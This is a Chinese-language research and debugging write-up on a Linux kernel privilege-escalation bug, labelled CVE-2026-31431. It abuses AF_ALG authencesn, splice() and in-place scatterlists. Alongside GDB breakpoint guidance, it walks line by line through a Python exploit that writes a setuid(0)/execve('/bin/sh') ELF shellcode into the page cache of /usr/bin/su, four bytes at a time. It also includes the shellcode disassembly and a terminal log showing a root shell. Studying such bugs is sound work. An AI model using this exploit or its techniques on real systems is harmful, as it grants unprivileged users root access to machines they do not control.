# CVE-2026-31431 调试所需背景知识

---

## 一、你需要先搞懂的 5 个核心概念

### 1. Page Cache（页缓存）是什么？

当 Linux 读一个文件（比如 `/usr/bin/su`），内核不会每次都去磁盘读，而是把文件内容缓存到内存中的「页」里。这个缓存就是 **page cache**。

```
磁盘上的 /usr/bin/su  →  内核读一次  →  内存中有一份副本（page cache）
                                         ↓
                              以后所有 read() / execve() 都读这份内存副本
```

**关键点**：page cache 是「内存中的文件副本」。如果你能修改 page cache 里的内容（不碰磁盘），所有后续读这个文件的进程都会看到被篡改后的内容。

---

### 2. Scatterlist（散列表）是什么？

内核做加密/解密时，数据可能分散在内存的不同页面里。Scatterlist 就是一个链表，每个节点指向一块内存页：

```
sg[0] → 指向页A的第0字节, 长度32字节
sg[1] → 指向页B的第0字节, 长度16字节
sg[2] → 指向页C的第0字节, 长度32字节
```

你可以把它想象成「内存块的索引数组」，让内核不连续的数据也能一起处理。

---

### 3. `splice()` 是什么？

`splice()` 是一个系统调用，能在「文件」和「管道」之间搬运数据，**不需要拷贝**——它只传递页的引用（指针）。

```
普通 read()：  磁盘 → 拷贝到用户 buffer → 拷贝到内核 buffer（两次拷贝）
splice()：    磁盘 → page cache 页 → 直接把页的指针传给管道 → 传给 socket（零拷贝）
```

**关键点**：`splice()` 之后，socket 的 scatterlist 里存放的是 **page cache 页的直接引用**。这些页就是目标文件在内存中的真实副本。

---

### 4. AF_ALG 是什么？

AF_ALG 是 Linux 的一种特殊 socket 类型，它让用户态程序能直接调用内核的加密算法：

```python
# 用户态代码
sock = socket.socket(AF_ALG, SOCK_SEQPACKET)  # 创建加密 socket
sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))  # 绑定算法
op_sock = sock.accept()  # 创建操作 socket
op_sock.sendmsg([aad], cmsg)  # 发送 AAD（关联数据）
op_sock.sendmsg([ciphertext])  # 发送密文
result = op_sock.recv(4096)  # 触发解密，拿结果
```

**关键点**：AF_ALG 不需要任何特权，普通用户就能用。

---

### 5. AEAD 是什么？assoclen 和 authsize 是什么？

AEAD = Authenticated Encryption with Associated Data（带关联数据的认证加密）。

一个 AEAD 解密操作的输入数据格式：

```
|<--- AAD (assoclen 字节) --->|<--- CT (cryptlen-authsize 字节) --->|<--- Tag (authsize 字节) --->|
|      关联数据，不加密       |           密文                       |       认证标签(完整性校验)     |
|    (这里 exploit 用了 8 字节)  |                                    |    (HMAC-SHA256 = 32 字节)     |
```

- **assoclen**：AAD 的长度（exploit 里设为 8）
- **authsize**：认证标签的长度（HMAC-SHA256 = 32 字节）
- **cryptlen**：密文 + Tag 的总长度

解密输出：

```
|<--- AAD (assoclen 字节) --->|<--- 明文 (cryptlen-authsize 字节) --->|
```

---

## 二、漏洞的三个「零件」

漏洞不是某个函数写错了，而是三个原本无害的设计组合在一起时产生了问题：

### 零件 A：authencesn 的越界写（2011年引入）

`authencesn` 是 IPsec 用的 AEAD 模板。IPsec 使用 64 位序列号，分两半：
- `seqno_hi`（高 32 位）：在 AAD 的第 0-3 字节
- `seqno_lo`（低 32 位）：在 AAD 的第 4-7 字节

authencesn 做 HMAC 计算时需要重排这两个值。它用了一个「巧妙」的办法——**拿输出 buffer 当临时草稿纸**：

```c
// crypto/authencesn.c 中的 crypto_authenc_esn_decrypt()

// 第1步：从 dst（输出区）读 AAD 的前 8 字节到 tmp
scatterwalk_map_and_copy(tmp, dst, 0, 8, 0);

// 第2步：把 seqno_hi 写回 dst[4..7]（AAD 区域内，正常）
scatterwalk_map_and_copy(tmp, dst, 4, 4, 1);

// 第3步：把 seqno_lo 写到 dst[assoclen + cryptlen] ← 越界！
scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);
```

**第 3 步是漏洞的核心**。`dst[assoclen + cryptlen]` 已经超出了合法输出区域。authencesn 假设这里可以随便写，因为以前只有 IPsec 内部调用，不会有 page cache 页出现在这个位置。

**你要观察的**：在 GDB 中 `crypto_authenc_esn_decrypt` 处，看 `assoclen + cryptlen` 的值，它会超过 AAD + 明文的总长度。

---

### 零件 B：splice() 把 page cache 页送进了 scatterlist（2015年引入）

当 exploit 执行：
```python
os.splice(file_fd, pipe_write_fd, 32)  # 把 /usr/bin/su 的 32 字节送入管道
os.splice(pipe_read_fd, alg_sock_fd, 32)  # 把管道数据送入 AF_ALG socket
```

内核不会拷贝数据，只是把 `/usr/bin/su` 的 page cache 页的**指针**放进 socket 的输入 scatterlist（TX SGL）。

**你要观察的**：在 `_aead_recvmsg` 中，看 TX SGL 的地址，它指向的是 `/usr/bin/su` 的 page cache 页。

---

### 零件 C：in-place 优化把 page cache 页链入了可写区域（2017年引入）

这是触发漏洞的最后一个零件。2017 年的 commit `72548b093ee3` 对 `algif_aead.c` 做了一个优化：解密时不再分别维护输入和输出两个 scatterlist，而是用同一个（in-place），减少拷贝。

在 `_aead_recvmsg` 中：

```c
// 漏洞版本的代码（6.6.1 中）：

// 1. 把 AAD + CT 从 TX SGL（输入）拷贝到 RX buffer（输出）
memcpy_sglist(&areq->dst, &areq->tsgl, used);

// 2. 把 auth tag 的页用 sg_chain 链到 RX buffer 末尾
//    这些页是 splice 送进来的 page cache 页！
sg_chain(areq->first_rsgl.sgl.sgt.sgl, ...);

// 3. 设置 src = dst（in-place 操作）
aead_request_set_crypt(req, rsgl_src, areq->first_rsgl.sgl.sgt.sgl, used, ctx->iv);
//                       ↑ 输入        ↑ 输出（同一个！）
```

此时输出 scatterlist 的结构：

```
req->dst 指向这里
        ↓
[ AAD | CT ]  →  [ Tag 页 = /usr/bin/su 的 page cache 页 ]
  用户内存           ↑ sg_chain 链入的，可写
```

**你要观察的**：在 `aead_request_set_crypt` 处，用 GDB 查看 `req->src` 和 `req->dst` 的值——它们是**同一个地址**。再看 scatterlist 的最后一个节点，它的地址应该在 `/usr/bin/su` 的 page cache 页范围内。

---

## 三、三个零件组合 → 漏洞

```
零件A: authencesn 往 dst[assoclen+cryptlen] 写 4 字节（seqno_lo）
零件B: splice() 让 page cache 页进入了 scatterlist
零件C: in-place 优化让 page cache 页出现在了 dst 的末尾

组合: authencesn 的越界写 → 写到了 page cache 页 → 篡改了 /usr/bin/su 的内存副本
```

---

## 四、Exploit 是怎么利用的？

### 第一步：创建 AF_ALG socket 并绑定算法

```python
a = socket.socket(38, 5, 0)  # AF_ALG=38, SOCK_SEQPACKET=5
a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
a.setsockopt(279, 1, keyblob)  # SOL_ALG=279, ALG_SET_KEY=1
u, _ = a.accept()  # u 是操作 socket
```

**GDB 观察**：在 `aead_recvmsg` 入口，`sock->sk` 指向的 `crypto_tfm` 应该是 `authencesn` 类型。

### 第二步：用 sendmsg 发送 AAD

```python
# AAD = 4字节零填充(SPI) + 4字节可控值(seqno_lo)
u.sendmsg([b"A"*4 + payload_chunk],
          [(279, 3, struct.pack("I", 0)),      # ALG_SET_OP = DECRYPT
           (279, 2, b'\x10' + b'\x00'*19),     # ALG_SET_IV = 16字节零
           (279, 4, b'\x08' + b'\x00'*3)],     # ALG_SET_AEAD_ASSOCLEN = 8
          32768)  # MSG_MORE
```

**GDB 观察**：在 `_aead_recvmsg` 中看 `ctx->used`（已收到的数据量）和 `ctx->more`（是否还有更多数据）。

### 第三步：用 splice 把目标文件送入 socket

```python
pipe_r, pipe_w = os.pipe()
os.splice(file_fd, pipe_w, 32)        # /usr/bin/su 的 32 字节 → 管道
os.splice(pipe_r, u.fileno(), 32)     # 管道 → AF_ALG socket
```

**GDB 观察**：在 `_aead_recvmsg` 中看 TX SGL 的内容。用 `x/32xb <sgl地址>` 查看，它应该包含 `/usr/bin/su` 的 .text 段内容。

### 第四步：recv 触发解密

```python
u.recv(8 + 32)  # 触发解密操作
```

此时内核执行：
1. 把 AAD + CT 从 TX SGL 拷贝到 RX buffer
2. 把 auth tag 页（page cache 页）用 sg_chain 链到 RX buffer 末尾
3. 调用 `crypto_authenc_esn_decrypt`
4. authencesn 把 seqno_lo（你 sendmsg 传的那 4 字节）写到 `dst[8 + 36] = dst[44]`
5. 由于 page cache 页在 dst 的末尾，这 4 字节写入了 `/usr/bin/su` 的 page cache

**GDB 观察**：在 `scatterwalk_map_and_copy` 的第三次调用（方向=写入），看：
- `src` 指向的 4 字节 = 你 sendmsg 中 AAD[4:8] 的值
- `dst` 的偏移 = `assoclen + cryptlen = 8 + 36 = 44`
- 写入的目标地址 = page cache 页中的某个位置

---

## 五、调试时的关键断点和观察清单

### 断点设置

```gdb
b _aead_recvmsg
b crypto_authenc_esn_decrypt
b scatterwalk_map_and_copy
b sg_chain
```

### 逐步观察清单

#### 断点 1：`_aead_recvmsg` 入口

```gdb
# 看 socket 类型
p sk->sk_family          # 应该是 38 (AF_ALG)
# 看已收到的数据量
p ctx->used
# 看 assoclen（从 sendmsg 的 cmsg 传来）
p ctx->assoclen          # 应该是 8
# 看是否还有更多数据
p ctx->more              # sendmsg 带 MSG_MORE 时为 1
```

#### 断点 2：`_aead_recvmsg` 中 memcpy_sglist 之后

```gdb
# 看 RX buffer（输出区）的内容
# areq->first_rsgl.sgl.sgt.sgl 是输出 scatterlist 的头
p areq->first_rsgl.sgl.sgt.sgl
# 用 x/16xb 看前 16 字节，应该是 AAD 的内容
```

#### 断点 3：`sg_chain` 调用处

```gdb
# 看被链入的页地址
# sg_chain 的第一个参数是 scatterlist 数组
# 看最后一个 sg 节点指向的页
p sg_page(last_sg)       # 这个页应该属于 /usr/bin/su 的 page cache
```

#### 断点 4：`aead_request_set_crypt` 调用处

```gdb
# 看 src 和 dst 是否相同（in-place 的标志）
p req->src               # 指向 scatterlist 头
p req->dst               # 应该和 src 完全相同
p req->src == req->dst   # 如果是 true，说明是 in-place（有漏洞）
```

#### 断点 5：`crypto_authenc_esn_decrypt` 入口

```gdb
# 看关键参数
p req->assoclen          # 8
p req->cryptlen          # 密文+tag 总长度
p req->assoclen + req->cryptlen  # 越界写的目标偏移
# 看 dst scatterlist 的总长度
# assoclen + cryptlen 应该超过 dst 的合法长度
```

#### 断点 6：`scatterwalk_map_and_copy` 第三次调用（方向=写入，偏移=assoclen+cryptlen）

这是**最关键**的断点。此时 authencesn 正在把 seqno_lo 写到越界位置。

```gdb
# 看写入方向（最后一个参数）
p dir                    # 1 = 写入，0 = 读取
# 看写入偏移
p offset                 # 应该等于 assoclen + cryptlen
# 看写入长度
p nbytes                 # 应该是 4
# 看 src（要写入的值）
x/4xb src                # 这 4 字节 = sendmsg AAD[4:8] = exploit 控制的值
# 看 dst 的目标地址
# scatterwalk_map_and_copy 会把 dst scatterlist 走到 offset 处
# 最终通过 kmap_local_page 映射页，得到虚拟地址
# 用 x/4xb 看这个地址的内容
```

#### 断点 7：`scatterwalk_map_and_copy` 返回后

```gdb
# 再看目标地址，值应该已经变了
x/4xb <目标地址>          # 应该等于 sendmsg AAD[4:8] 的值
```

---

## 六、一句话总结漏洞

**三个无害设计（authencesn 的越界写 + splice 的零拷贝 + in-place 优化）组合在一起，让普通用户能往任意可读文件的内存缓存中写入 4 字节，反复利用即可篡改 setuid 二进制文件的 page cache，从而获得 root 权限。**

---

## 七、Exploit 源码逐行解读

### 原始代码（格式化后）

```python
#!/usr/bin/env python3
import os as g, zlib, socket as s

def d(x):
    return bytes.fromhex(x)

def c(f, t, c):
    # --- 建立 AF_ALG AEAD socket ---
    a = s.socket(38, 5, 0)                                    # AF_ALG, SOCK_SEQPACKET
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))     # 绑定算法
    h = 279                                                    # SOL_ALG
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0'*64))                   # ALG_SET_KEY: keyblob
    v(h, 5, None, 4)                                          # ALG_SET_AEAD_AUTHSIZE = 4
    u, _ = a.accept()                                          # 接受操作 socket

    # --- 构造越界写 ---
    o = t + 4                                                  # splice 长度
    i = d('00')                                                # b'\x00'
    u.sendmsg(
        [b"A"*4 + c],                                         # AAD = 4字节零 + 4字节shellcode
        [(h, 3, i*4),                                         # ALG_SET_OP = DECRYPT (0)
         (h, 2, b'\x10' + i*19),                              # ALG_SET_IV = 16字节零IV
         (h, 4, b'\x08' + i*3)],                              # ALG_SET_AEAD_ASSOCLEN = 8
        32768                                                  # MSG_MORE
    )

    # --- splice 把 /usr/bin/su 的 page cache 页送入 socket ---
    r, w = g.pipe()
    n = g.splice
    n(f, w, o, offset_src=0)           # /usr/bin/su → 管道（零拷贝，传页引用）
    n(r, u.fileno(), o)                # 管道 → AF_ALG socket（页进入 TX SGL）

    # --- 触发解密 → authencesn 越界写 4 字节到 page cache ---
    try:
        u.recv(8 + t)                  # 触发解密，HMAC 必然失败，但 4 字节写已生效
    except:
        0                              # 忽略所有错误

# --- 主流程 ---
f = g.open("/usr/bin/su", 0)           # 只读打开 su（触发 page cache 加载）
i = 0
e = zlib.decompress(d("78daab77f57..."))  # 解压 160 字节的 ELF shellcode
while i < len(e):
    c(f, i, e[i:i+4])                 # 每次写 4 字节
    i += 4
```

---

### 漏洞利用的数学原理（精妙之处）

#### 为什么 `o = t + 4`？

`t` 是当前要覆盖的文件偏移，`o = t + 4` 是 splice 的总长度。

内核处理 AEAD 输入时：
```
输入 = AAD(8字节, 来自sendmsg) + CT+Tag(o字节, 来自splice)
```

其中 `authsize = 4`（通过 `ALG_SET_AEAD_AUTHSIZE` 设置），所以：
- **Tag** = splice 数据的最后 4 字节 → 位于 `/usr/bin/su` 的文件偏移 `[t, t+4)`
- **CT** = splice 数据的前 `o - 4 = t` 字节

authencesn 越界写的目标偏移：
```
dst[assoclen + cryptlen] = dst[8 + o] = dst[8 + t + 4] = dst[t + 12]
```

RX buffer（输出区）的布局：
```
偏移 0                    偏移 8          偏移 8+t        偏移 t+12
|<--- AAD(8字节) --->|<--- CT(t字节) --->|<--- Tag(4字节, page cache页) --->|
     拷贝到用户内存         拷贝到用户内存      sg_chain 链入，不拷贝
                                              ↑
                                   越界写落在这里（正好是 su 文件偏移 t 处）
```

**为什么偏移刚好对齐？**

- RX buffer 中合法数据长度 = `8 + (o - 4) = 8 + t = t + 8` 字节
- 越界写位置 = `dst[t + 12]`
- 差值 = `(t + 12) - (t + 8) = 4` → 正好越过合法区域 4 字节，落在 Tag 页的第 0-3 字节
- Tag 页来自 splice 的最后 4 字节 = `/usr/bin/su` 的文件偏移 `[t, t+4)`
- 所以写入目标 = `/usr/bin/su` 的 page cache 中偏移 t 处

**写入的值是什么？**

sendmsg 的 AAD = `b"A"*4 + e[t:t+4]`，其中：
- AAD[0:4] = `b"A"*4` → seqno_hi（authencesn 读取后会还原）
- AAD[4:8] = `e[t:t+4]` → **seqno_lo = 要写入的 4 字节**

authencesn 执行 `scatterwalk_map_and_copy(tmp+1, dst, assoclen+cryptlen, 4, 1)` 时：
- `tmp+1` 指向 seqno_lo = `e[t:t+4]`
- 写入目标 = `/usr/bin/su` 的 page cache 偏移 t 处

**每次调用写 4 字节，循环 40 次（160/4），把整个 ELF 写入 `/usr/bin/su` 的 page cache。**

---

### authsize = 4 的妙用

```python
v(h, 5, None, 4)  # ALG_SET_AEAD_AUTHSIZE = 4
```

HMAC-SHA256 正常输出 32 字节，但 exploit 强制设为 4。原因：

1. **控制 Tag 位置**：authsize=4 意味着 Tag 只有 4 字节，刚好等于每次写入的粒度
2. **精确对齐**：Tag 页在 scatterlist 中的位置 = splice 数据的最后 4 字节 = 文件偏移 `[t, t+4)`
3. **越界距离可控**：`dst[assoclen+cryptlen]` 正好越过合法区域 4 字节落在 Tag 页开头

如果 authsize=32（默认），Tag 会占 32 字节，越界写的位置会落在 Tag 页的不同偏移，无法精确控制写入目标。

---

### recv(8+t) 的大小为什么变化？

```python
u.recv(8 + t)
```

- `8` = assoclen（AAD 长度）
- `t` = 当前 CT 长度（`o - authsize = (t+4) - 4 = t`）
- 总计 = `8 + t` = 解密输出的预期长度（AAD + 明文）

recv buffer 必须 >= 输出长度，否则内核会截断。每次 t 增加 4，输出也增加 4，所以 recv 大小跟着变。

---

### Shellcode 分析：160 字节的微型 ELF

#### ELF 结构

```
偏移    大小    内容
0x00    64B    ELF64 Header (e_entry = 0x400078)
0x40    56B    Program Header (PT_LOAD, vaddr=0x400000, filesz=0x9e)
0x78    40B    Shellcode (entry point)
0x9e    2B     填充 (凑到 160 字节)
```

#### 反汇编（入口在 offset 120 = 0x78）

```asm
; === setuid(0) ===
[120] 31 c0        xor eax, eax          ; eax = 0
[122] 31 ff        xor edi, edi          ; edi = 0 (uid = 0 = root)
[124] b0 69        mov al, 0x69          ; eax = 105 = __NR_setuid
[126] 0f 05        syscall               ; setuid(0)

; === execve("/bin/sh", NULL, NULL) ===
[128] 48 8d 3d 0f  lea rdi, [rip+15]     ; rdi = 指向 "/bin/sh" (offset 150)
[132] 00 00 00
[135] 31 f6        xor esi, esi          ; argv = NULL
[137] 6a 3b        push 0x3b             ; 59 = __NR_execve
[139] 58           pop rax               ; rax = 59
[140] 99           cdq                   ; rdx = 0 (envp = NULL)
[141] 0f 05        syscall               ; execve("/bin/sh", NULL, NULL)

; === exit(0) (fallback) ===
[143] 31 ff        xor edi, edi          ; status = 0
[145] 6a 3c        push 0x3c             ; 60 = __NR_exit
[147] 58           pop rax               ; rax = 60
[148] 0f 05        syscall               ; exit(0)

; === 字符串 ===
[150] "/bin/sh\0"  ; 8 字节
```

#### 为什么用 ELF 而不是裸 shellcode？

- `execve()` 要求参数是合法的 ELF 文件
- 内核 ELF loader 读取 ELF header → 找到 entry point → 跳转执行
- 这个微型 ELF 的 `e_entry = 0x400078`，正好指向 shellcode
- `p_vaddr = 0x400000`，shellcode 在 `0x400078`，偏移 = 0x78 = 120
- 文件大小只有 158 字节，loader 把整个文件映射到内存，shellcode 可直接执行

#### 为什么 setuid(0) 能成功？

- `/usr/bin/su` 是 **setuid-root** 二进制（`-rwsr-xr-x`）
- `execve()` 加载 su 时，进程的 **effective UID = 0**
- shellcode 调用 `setuid(0)` 把 **real UID** 也改成 0
- 之后 `execve("/bin/sh")` 产生的 shell 进程 real+effective UID 都是 0 → root shell

---

### 漏洞利用完整流程图

```
┌─────────────────────────────────────────────────────────────────┐
│ 主循环: for t in range(0, 160, 4):                              │
│                                                                 │
│  ① socket() + bind("aead","authencesn(...)") + setsockopt       │
│     → 创建加密 socket，设置 authsize=4                           │
│                                                                 │
│  ② sendmsg(AAD = b"\x00"*4 + shellcode[t:t+4])                 │
│     → seqno_lo = 要写入的 4 字节                                 │
│                                                                 │
│  ③ splice(/usr/bin/su → pipe → AF_ALG socket, len=t+4)          │
│     → page cache 页进入 TX SGL（零拷贝）                         │
│                                                                 │
│  ④ recv(8+t) 触发解密                                           │
│     → 内核: AAD+CT 拷贝到 RX buffer                             │
│     → 内核: Tag 页(=page cache) 用 sg_chain 链到 RX buffer 末尾  │
│     → authencesn: 写 seqno_lo 到 dst[assoclen+cryptlen]         │
│     → 写入位置 = Tag 页 = /usr/bin/su 的 page cache 偏移 t       │
│     → HMAC 失败 → recv 抛异常 → exploit 捕获并忽略              │
│                                                                 │
│  ⑤ 循环 40 次，每次写 4 字节                                    │
│     → /usr/bin/su 的 page cache 前 160 字节 = 完整 ELF shellcode │
└─────────────────────────────────────────────────────────────────┘
                              ↓
                    手动执行 su 或 su bob
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  内核 execve("/usr/bin/su")                                     │
│  → 从 page cache 读取 ELF header（已被篡改）                    │
│  → e_entry = 0x400078 → 跳转到 shellcode                       │
│  → setuid(0) → execve("/bin/sh") → root shell!                 │
│                                                                 │
│  磁盘上的 /usr/bin/su 原封不动（page cache ≠ 磁盘）             │
│  重启或 echo 3 > /proc/sys/vm/drop_caches 即可恢复              │
└─────────────────────────────────────────────────────────────────┘
```

---

### 代码风格精妙之处

1. **变量名极度压缩**：`d`=fromhex, `c`=chunk函数, `f`=file, `t`=offset, `g`=os, `s`=socket
   → 整个 exploit 只有 ~300 字节有效代码

2. **每次循环重建 socket**：每次调用 `c(f,t,c)` 都新建 AF_ALG socket
   → 避免上一次操作的残留状态影响下一次

3. **`try/except: 0`**：recv() 必然失败（HMAC 验证不过），但 4 字节写已在失败前完成
   → 用最简方式吞掉错误

4. **`ALG_SET_AEAD_AUTHSIZE=4`**：把认证标签截断为 4 字节
   → 精确控制越界写的目标偏移

5. **zlib 压缩 shellcode**：160 字节 ELF 压缩后只需 91 字节 hex
   → 减少 exploit 体积


## others

底层 cipher 换成 ctr(aes)、cbc(camellia) 甚至任何其他分组密码都能触发。exploit 用 cbc(aes) 只是因为这是 IPsec ESP 的标准组合，authencesn 本身就是为 IPsec 设计的模板。

HMAC 也一样，换成 md5、sha512 都行——反正 HMAC 验证必然失败（数据是伪造的），exploit 只需要越界写的那个副作用，不关心加解密结果。


```shell
asdf@(none):~$ md5sum /usr/bin/su
fb19fb204707f4a16562d2267723da41  /usr/bin/su
asdf@(none):~$ python3 /mnt/shared/exp.py 
[   28.823912] random: crng init done
asdf@(none):~$ md5sum /usr/bin/su
11c7f483efa1278593b31d45c72d19a0  /usr/bin/su
asdf@(none):~$ echo 3 | sudo tee /proc/sys/vm/drop_caches
-bash: sudo: command not found
asdf@(none):~$ echo 3 | tee /proc/sys/vm/drop_caches
tee: /proc/sys/vm/drop_caches: Permission denied
3
asdf@(none):~$ su
[   98.531387] process 'su' launched '/bin/sh' with NULL argv: empty string added
: 0: can't access tty; job control turned off
# echo 3 | sudo tee /proc/sys/vm/drop_caches
: 1: sudo: not found
# echo 3 | tee /proc/sys/vm/drop_caches
3
[  112.879745] tee (82): drop_caches: 3
# md5sum /usr/bin/su
11c7f483efa1278593b31d45c72d19a0  /usr/bin/su
# 
```

一、为什么 echo 3 > /proc/sys/vm/drop_caches 无效？

    drop_caches 只会回收干净页（Clean Page），即与磁盘内容一致且未标记为脏的页。

    漏洞修改了页缓存，内核将这些页标记为脏页（Dirty）。由于根文件系统是只读挂载（ro），内核无法将这些脏页写回磁盘。

    脏页不会被 drop_caches 释放，因为它们包含尚未持久化的数据（即使持久化会失败）。所以它们一直留在内存中，所有后续 read() 和 md5sum 都返回篡改后的内容。

这就是你为什么看到 md5sum 无法恢复原值的原因。

---

## 八、调试踩坑记录（两天实战总结）

以下方法在 QEMU 远程调试内核 CVE-2026-31431 时均失败或效果极差，记录原因供后续参考。

### 方法 1：GDB Python 类断点脚本（tracecve.py）

**做法**：用 Python `gdb.Breakpoint` 类在 `scatterwalk_map_and_copy` 设置断点，在 `stop()` 方法中读寄存器、分类调用类型、过滤噪声。

**失败原因**：

1. **`$lx_current()` 类型错误**：`gdb.parse_and_eval("$lx_current()")` 返回的类型在优化编译后不可靠，`.comm`、`.pid` 等字段访问经常抛 `Invalid data type for function to be called` 或 `Structure has no component named...`。

2. **backtrace 太慢**：用 `gdb.execute("bt 6")` 判断调用者是否来自 `crypto_authenc_esn_decrypt`，在 QEMU 远程调试中每次 backtrace 耗时数秒。`scatterwalk_map_and_copy` 是内核高频函数，每秒命中成百上千次，backtrace 导致完全卡死。

3. **FinishBreakpoint 不可靠**：试图用 `gdb.FinishBreakpoint` 在 `crypto_authenc_esn_decrypt` 返回时清除 flag，但 QEMU 远程调试中 FinishBreakpoint 经常丢失或不触发，导致 flag 永远为 True，后续所有命中都被误报。

4. **GDB 内部 Python 环境污染**：嵌套的 `gdb.execute("python ... end")` 块会重新导入模块，导致 `datetime` 等模块的命名空间被覆盖，引发 `AttributeError: module 'datetime' has no attribute 'now'`。

### 方法 2：GDB 原生条件断点（Python-free）

**做法**：用 GDB 内置的 `break func if condition` 语法，配合 `$authn_active` 等便利变量做 flag，避免 Python 开销。

**失败原因**：

1. **条件评估仍有开销**：即使条件为 false，GDB 仍需通过 QEMU GDB stub 进行一次完整的"停-评估-恢复"通信周期。对于 `scatterwalk_map_and_copy` 这种每秒被调用数千次的函数，每次评估的网络往返延迟累积起来就是灾难。

2. **`$authn_active` flag 设置不可靠**：在 `crypto_authenc_esn_decrypt` 的 `commands` 块中执行 `set $authn_active = 1`，但因为该函数被优化编译，断点实际停在的指令位置可能不是函数入口，导致 flag 时机不对。

3. **源码行断点被系统流量淹没**：`break authencesn.c:301 if $rdx > 4` 本意是过滤系统 IPsec 流量（`$rdx == 4`），但条件断点在 QEMU 上仍然慢——系统 IPsec 每秒触发几十次，每次都走一遍条件评估。

### 方法 3：GDB 脚本 + `set non-stop on` / `set target-async on`

**做法**：启用 GDB 的非停止模式，期望断点评估不阻塞主线程。

**失败原因**：

1. **QEMU stub 不支持 non-stop**：QEMU 内置的 GDB server 实现不完整，`set non-stop on` 会报 `Cannot execute this command while the target is running` 或行为异常。

2. **`set target-async` 已废弃**：新版 GDB 标记为 deprecated，且对 QEMU 远程调试无实际帮助。

### 方法 4：GDB `break scatterwalk_map_and_copy if $rdx == 8`

**做法**：用精确值匹配漏洞写入点（exploit 的第一次写入 `assoclen + cryptlen = 8`）。

**失败原因**：

1. **只捕获第一次写入**：exploit 循环 40 次，每次 `assoclen + cryptlen` 递增（8, 12, 16, ..., 164），`$rdx == 8` 只命中第一次，后续 39 次全部错过。

2. **改用 `$rdx > 4` 仍然慢**：见方法 3 的原因。

### 方法 5：`break scatterwalk_map_and_copy` 无条件断点 + 手动过滤

**做法**：不设条件，在 `commands` 块中用 `if` 打印后 `continue`。

**失败原因**：

1. **输出爆炸**：内核中所有调用 `scatterwalk_map_and_copy` 的路径都会命中，包括 IPsec、WireGuard、dm-crypt、fscrypt 等。每秒产生数千行输出，GDB 终端直接卡死在刷屏。

2. **即使有 `silent` + `continue`，每次命中仍需 QEMU 通信往返**：性能问题的根源不是打印，而是远程调试的协议开销。

### 最终结论：用 `pr_info` 是正确做法

**内核开发者调试高频热路径的标准做法就是 `pr_info`/`printk`**，而不是 GDB。原因：

| 维度 | GDB 远程调试 | pr_info |
|------|-------------|---------|
| 单次开销 | ~10ms（QEMU GDB stub 往返） | ~1μs（内核 ring buffer 写入） |
| 1000 次命中耗时 | ~10 秒（明显卡顿） | ~1ms（无感知） |
| 输出位置 | GDB 终端（需要人看） | dmesg / 内核日志（可 grep） |
| 条件过滤 | 每次都要评估（慢） | 在 C 代码中用 `if` 判断（快） |
| 可靠性 | 受 QEMU GDB stub 实现限制 | 内核原生，零兼容问题 |

**实际操作**：在 `crypto/authencesn.c` 的 `crypto_authenc_esn_decrypt()` 函数中，第 301 行 `scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1)` 之后加一行 `pr_info`：

```c
scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);
pr_info("CVE_DEBUG assoclen=%u cryptlen=%u vuln_offset=%u seqno_lo=%08x\n",
        assoclen, cryptlen, assoclen + cryptlen, tmp[1]);
```

重新编译内核后运行 exploit，`dmesg | grep CVE_DEBUG` 即可看到完整漏洞写入记录。这是唯一在 QEMU 环境下可靠工作的调试方法。